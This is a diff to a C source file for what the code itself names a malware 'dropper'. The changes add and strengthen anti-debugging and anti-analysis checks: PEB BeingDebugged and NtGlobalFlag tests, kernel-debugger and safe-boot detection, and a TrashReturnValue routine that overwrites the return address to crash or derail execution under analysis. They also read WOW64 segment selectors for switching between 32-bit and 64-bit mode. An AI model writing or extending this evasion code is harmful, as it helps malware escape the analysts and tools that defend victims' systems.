@@ -1,6 +1,5 @@
 #include <config.h>
 
-/* TODO: Fill with randoms */
 CONFIG Config = {
     RTLP_LCG_DWORD, // Features
     RTLP_LCG_DWORD, // Cpu
@@ -10,9 +9,18 @@ CONFIG Config = {
     RTLP_LCG_DWORD, // NtVersion
     RTLP_LCG_DWORD, // NtVersion
     RTLP_LCG_DWORD, // NtVersion
-    RTLP_LCG_DWORD, // Os
     RTLP_LCG_DWORD  // Os
 };
+
+#if SCFG_DROPPER_IGNORE_HARDWARE_DBG == OFF || SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+    static
+    VOID
+    FORCEINLINE
+    TrashReturnValue(VOID)
+    {
+        *((PULONG_PTR)_AddressOfReturnAddress()) = (ULONG_PTR)RTLP_LCG_NATIVE;
+    }
+#endif
 
 static
 BOOL
@@ -93,7 +101,7 @@ ConfigIsProcessorCompatible(VOID)
     $DLOG2(DLG_FLT_DEFAULT, "Config.Cpu.bAmd        = %u", Config.Cpu.bAmd);
     $DLOG2(DLG_FLT_DEFAULT, "Config.Cpu.bUnderWow64 = %u", Config.Cpu.bUnderWow64);
 
-    $DLOG1(DLG_FLT_INFO, "Done!");
+    $DLOG1(DLG_FLT_INFO, "Done");
 
     return TRUE;
 }
@@ -180,15 +188,19 @@ ConfigIsHyperVisorSupported(VOID)
         }
     #endif
 
-    $DLOG1(DLG_FLT_INFO, "Done!");
+    $DLOG1(DLG_FLT_INFO, "Done");
 
     #undef CBC_VENDOR
 
-    #if SCFG_IGNORE_HARDWARE_DBG == OFF
-        return (Config.HyperVisor.bEnabled == 0x00000001);
-    #else
-        return TRUE;
+    #if SCFG_DROPPER_IGNORE_HARDWARE_DBG == OFF
+        if (Config.HyperVisor.bEnabled != 0x00000001) {
+            TrashReturnValue();
+
+            return FALSE;
+        }
     #endif
+
+    return TRUE;
 }
 
 static
@@ -217,17 +229,16 @@ ConfigIsNtVersionSupported(VOID)
         $DLOG0(DLG_FLT_WARNING, "Running on deprecated version");
     } else {
         ULONG dwBuildNumbers[] = {
-            NTVERSION_WIN7_BNO,
-            NTVERSION_WIN7_SP1_BNO,
-            NTVERSION_WIN8_BNO,
-            NTVERSION_WIN9_BNO,
-            NTVERSION_WIN10_BNO,
-            NTVERSION_WIN10_1511_BNO,
-            NTVERSION_WIN10_1607_BNO,
-            NTVERSION_WIN10_1703_BNO,
-            NTVERSION_WIN10_1709_BNO,
-            NTVERSION_WIN10_1803_BNO,
-            NTVERSION_WIN10_1809_BNO
+            0xFFFFFFFF,               // 0 ( Windows 7 SP1 and Windows 7 are the same)
+            NTVERSION_WIN8_BNO,       // 1
+            NTVERSION_WIN9_BNO,       // 2
+            NTVERSION_WIN10_BNO,      // 3
+            NTVERSION_WIN10_1511_BNO, // 4
+            NTVERSION_WIN10_1607_BNO, // 5
+            NTVERSION_WIN10_1703_BNO, // 6
+            NTVERSION_WIN10_1709_BNO, // 7
+            NTVERSION_WIN10_1803_BNO, // 8
+            NTVERSION_WIN10_1809_BNO  // 9
         };
 
         for (ULONG_PTR i = 0; i != ARRAYSIZE(dwBuildNumbers); i++) {
@@ -242,12 +253,24 @@ ConfigIsNtVersionSupported(VOID)
     return TRUE;
 }
 
+//PRAGMA_OPTIMIZATION_LEVEL(2) // TODO:
 static
 BOOL
 FORCEINLINE
 ConfigIsWindowsSupported(VOID)
 {
-    #define INVALID_NTGLOBALFLG 0x70
+    enum {
+        NtGlobalInvalidFlags = (
+            FLG_KERNEL_STACK_TRACE_DB     |
+            FLG_USER_STACK_TRACE_DB       |
+            FLG_HEAP_VALIDATE_ALL         |
+            FLG_HEAP_ENABLE_FREE_CHECK    |
+            FLG_HEAP_VALIDATE_PARAMETERS  |
+            FLG_ENABLE_KDEBUG_SYMBOL_LOAD |
+            FLG_ENABLE_SYSTEM_CRIT_BREAKS |
+            FLG_ENABLE_CSRDEBUG
+        )
+    };
 
     $DLOG0(DLG_FLT_INFO, "Checking if windows is supported");
 
@@ -256,24 +279,6 @@ ConfigIsWindowsSupported(VOID)
     }
 
     BOOL bRval = TRUE;
-    PKUSER_SHARED_DATA UserShared = RtlpUserShared();
-
-    if (UserShared->SafeBootMode) {
-        $DLOG1(DLG_FLT_CRITICAL, "UserShared.SafeBootMode is enabled!");
-
-        #if SCFG_IGNORE_SAFEBOOT == OFF
-            bRval = FALSE;
-        #endif
-    }
-
-    if (UserShared->KdDebuggerEnabled) {
-        $DLOG1(DLG_FLT_CRITICAL, "UserShared.KdDebuggerEnabled is enabled!");
-
-        #if SCFG_IGNORE_HARDWARE_DBG == OFF
-        bRval = FALSE;
-        #endif
-    }
-
     PTEB Teb = RtlpGetTeb();
 
     {
@@ -282,16 +287,18 @@ ConfigIsWindowsSupported(VOID)
         if (Peb->BeingDebugged) {
             $DLOG1(DLG_FLT_CRITICAL, "Peb32.BeingDebugged is enabled!");
 
-            #if SCFG_IGNORE_SOFTWARE_DBG == OFF
-            bRval = FALSE;
+            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+                bRval = FALSE;
+                TrashReturnValue();
             #endif
         }
 
-        if (Peb->NtGlobalFlag & INVALID_NTGLOBALFLG) {
+        if (Peb->NtGlobalFlag & NtGlobalInvalidFlags) {
             $DLOG1(DLG_FLT_CRITICAL, "Peb32.NtGlobalFlag contains unwanted debug flags");
 
-            #if SCFG_IGNORE_SOFTWARE_DBG == OFF
-            bRval = FALSE;
+            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+                bRval = FALSE;
+                TrashReturnValue();
             #endif
         }
     }
@@ -302,35 +309,54 @@ ConfigIsWindowsSupported(VOID)
         if (Peb->BeingDebugged) {
             $DLOG1(DLG_FLT_CRITICAL, "Peb64.BeingDebugged is enabled!");
 
-            #if SCFG_IGNORE_SOFTWARE_DBG == OFF
-            bRval = FALSE;
+            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+                bRval = FALSE;
+                TrashReturnValue();
             #endif
         }
 
-        if (Peb->NtGlobalFlag & INVALID_NTGLOBALFLG) {
+        if (Peb->NtGlobalFlag & NtGlobalInvalidFlags) {
             $DLOG1(DLG_FLT_CRITICAL, "Peb64.NtGlobalFlag contains unwanted debug flags");
 
-            #if SCFG_IGNORE_SOFTWARE_DBG == OFF
-            bRval = FALSE;
+            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+                bRval = FALSE;
+                TrashReturnValue();
             #endif
         }
     }
+	
+	PKUSER_SHARED_DATA UserShared = RtlpUserShared();
+
+    if (UserShared->SafeBootMode) {
+        $DLOG1(DLG_FLT_CRITICAL, "UserShared.SafeBootMode is enabled!");
+
+        #if SCFG_DROPPER_IGNORE_SAFEBOOT == OFF
+            bRval = FALSE;
+        #endif
+    }
+
+    if (UserShared->KdDebuggerEnabled) {
+        $DLOG1(DLG_FLT_CRITICAL, "UserShared.KdDebuggerEnabled is enabled!");
+
+        #if SCFG_DROPPER_IGNORE_HARDWARE_DBG == OFF
+            bRval = FALSE;
+            TrashReturnValue();
+        #endif
+    }
 
     if (Config.Cpu.bUnderWow64) {
-        Config.Os.dwWow64CallOffset =  (DWORD)((PULONG_PTR)Teb->WOW32Reserved);
-        Config.Os.wLongModeSelector = *(PWORD )((ULONG_PTR)Config.Os.dwWow64CallOffset + 5);
+        Config.Os.wLongModeSelector   = *(PWORD )((ULONG_PTR)Teb->WOW32Reserved + 5);
 
         __asm {
             mov ax, cs
             mov word ptr [Config.Os.wLegacyModeSelector], ax
         };
 
-        $DLOG1(DLG_FLT_DEFAULT, "Config.Os.dwWow64CallOffset   = 0x%p",   Config.Os.dwWow64CallOffset);
         $DLOG1(DLG_FLT_DEFAULT, "Config.Os.wLongModeSelector   = 0x%04X", Config.Os.wLongModeSelector);
         $DLOG1(DLG_FLT_DEFAULT, "Config.Os.wLegacyModeSelector = 0x%04X", Config.Os.wLegacyModeSelector);
     }
 
-    $DLOG1(DLG_FLT_INFO, "Done!");
+    $DLOG1(DLG_FLT_INFO, "Done");
 
     #undef INVALID_NTGLOBALFLG
 
@@ -338,6 +364,7 @@ ConfigIsWindowsSupported(VOID)
 }
 
 BOOL
+DECLSPEC_NOINLINE
 InitConfig(VOID)
 {
     RtlpZeroMemoryInstr(&Config, sizeof(Config));
